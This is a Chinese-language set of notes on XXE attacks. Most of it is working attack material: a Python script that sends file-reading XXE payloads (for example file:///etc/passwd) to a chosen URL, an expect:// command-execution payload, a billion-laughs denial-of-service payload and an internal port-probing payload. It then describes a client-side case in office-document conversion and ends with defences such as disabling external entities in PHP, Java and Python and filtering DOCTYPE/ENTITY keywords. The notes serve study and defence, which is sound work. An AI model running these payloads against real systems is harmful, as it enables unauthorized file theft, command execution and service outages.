# XXE攻击思路



## 1 读取文件.py

```
#!/usr/bin/python
# -*- coding:utf-8 -*-
import urllib2

if __name__ == '__main__':

    print u'输入要访问的地址，如http://127.0.0.1/xml/xxe2.php'
    url = raw_input()
    count=1
    while count==1:
        print u'输入要读取的文件，如file:///etc/passwd'
        payload = raw_input()
        headers = {'Content-type': 'text/xml'}
        xml = '<?xml version="1.0" encoding="utf-8"?><!DOCTYPE xxe [<!ELEMENT name ANY ><!ENTITY xxe SYSTEM "' + payload + '" >]><root><name>&xxe;</name></root>'
        req = urllib2.Request(url = url,headers = headers, data = xml)
        res_data = urllib2.urlopen(req)
        res = res_data.read()
        print res
```

[![img](https://gitee.com/taochiyu/blogimage/raw/master/img/20211103124006.png)](https://xzfile.aliyuncs.com/media/upload/picture/20191202152024-3548448c-14d4-1.png)
通过urllib2的request方法用POST方式向目标地址发送XML数据，返回的数据即为服务器相关文件内容。

## 2、执行系统命令

这个好像只在php5.。  php7 不支持 expect 模块

在安装expect扩展的PHP环境里执行系统命令，其他协议也有可能可以执行系统命令。

```
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE xxe [
<!ELEMENT name ANY >
<!ENTITY xxe SYSTEM "expect://id" >]>
<root>
<name>&xxe;</name>
</root>
```

通过XXE可以实现RCE的实例很少。

## 3、拒绝服务攻击(Dos)

```
<?xml version="1.0"?>
   <!DOCTYPE lolz [
<!ENTITY lol "lol">
<!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
<!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
<!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
<!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
<!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
<!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
<!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
<!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<lolz>&lol9;</lolz>
```

**原理**：递归引用,lol 实体具体还有 “lol” 字符串，然后一个 lol2 实体引用了 10 次 lol 实体，一个 lol3 实体引用了 10 次 lol2 实体，此时一个 lol3 实体就含有 10^2 个 “lol” 了，以此类推，lol9 实体含有 10^8 个 “lol” 字符串,最后再引用lol9。

## 4、探测内网端口与攻击内网网站

**探测内网端口**

```
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE xxe [
<!ELEMENT name ANY >
<!ENTITY xxe SYSTEM "http://127.0.0.1:80" >]>
<root>
<name>&xxe;</name>
</root>
```

3306端口开放



## **三、客户端XXE案例**

​	日前，某office文档转换软件被爆存在XXE漏洞（PS:感谢TSRC平台白帽子Titans`报告漏洞），某一应用场景为：Web程序调用该office软件来获取office文档内容后提供在线预览。由于该软件在处理office文档时，读取xml文件且允许引用外部实体，当用户上传恶意文档并预览时触发XXE攻击。详情如下：


	新建一个正常文档，内容为Hi TSRC，



![img](https://security.tencent.com/uploadimg_dir/201409/34f7f2ecbd1564ee98c22cf0fb1a4a25.png)



​	使用该软件转换后可以得到文本格式的文档内容，



![img](https://security.tencent.com/uploadimg_dir/201409/45284cfd4997e2eee013248e239aa0f9.png)



![img](https://security.tencent.com/uploadimg_dir/201409/a2d2d2bf23e1808dee35d7b16dc64c74.png)



​	当往该docx的xml文件注入恶意代码（引用外部实体）时，可进行XXE攻击。



![img](https://gitee.com/taochiyu/blogimage/raw/master/img/20211103124250.png)



![img](https://gitee.com/taochiyu/blogimage/raw/master/img/20211103124244.png)



##  文章



`https://xz.aliyun.com/t/6887#toc-3`

`https://medium.com/@klose7/xxe-attacks-part-2-xml-dtd-related-attacks-a572e8deb478`

`https://security.tencent.com/index.php/blog/msg/69`

`https://www.shuzhiduo.com/A/obzb8R3Q5E/`



## 注意几点：

Libxml2.9.0 以后 ，默认不解析外部实体，对于PHP版本不影响XXE的利用

默认就是libxml_disable_entity_loader(true);



## 0x06 XXE漏洞防御

**1、使用开发语言提供的禁用外部实体的方法**
php:

```
libxml_disable_entity_loader(true);
```

java:

```
DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();
dbf.setExpandEntityReferences(false);
```

Python:

```
from lxml import etree
xmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False))
```

**2、过滤用户提交的XML数据**
过滤关键字：`<\!DOCTYPE`和`<\!ENTITY`，或者`SYSTEM`和`PUBLIC`。
**3、不允许XML中含有自己定义的DTD**